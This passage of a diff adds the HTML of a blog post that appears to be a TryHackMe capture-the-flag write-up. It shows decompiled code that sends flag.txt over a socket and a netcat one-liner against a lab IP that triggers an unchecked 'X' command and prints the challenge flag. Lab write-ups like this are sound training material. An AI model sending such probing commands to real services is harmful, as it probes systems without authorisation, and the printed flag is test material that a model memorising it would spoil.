+</span></span><span class="line"><span class="cl">  stream = fopen(&#34;flag.txt&#34;, &#34;r&#34;);
+</span></span><span class="line"><span class="cl">  if ( stream )
+</span></span><span class="line"><span class="cl">  {
+</span></span><span class="line"><span class="cl">    n = fread(ptr, 1uLL, 0x400uLL, stream);
+</span></span><span class="line"><span class="cl">    send(a1, ptr, n, 0);
+</span></span><span class="line"><span class="cl">    fclose(stream);
+</span></span><span class="line"><span class="cl">  }
+</span></span><span class="line"><span class="cl">  return ...;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>Since <code>fun_readflag_7</code> and the related character <code>X</code> don&rsquo;t have any checks lets try to use that as an input to get the flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo -e &#34;X\n&#34; | nc 10.10.217.79 9003
+</span></span><span class="line"><span class="cl">Compute some magic!
+</span></span><span class="line"><span class="cl">THM{s0m3_mag1c_that_can_b3_computed}
+</span></span></code></pre></div>
+    </div>
+</div>
+
+            </main>
+        </div>
+
+
+        <footer class="footer">
+    
+        <span>
+            © 2025 Sir_X Blog, Built with
+            <a href="https://gohugo.io" class="footerLink">Hugo</a> and
+            <a href="https://github.com/LordMathis/hugo-theme-nightfall" class="footerLink">Nightfall</a> theme
+        </span>
+    
+</footer>
+    </div>
+
+</body>
+
+</html>
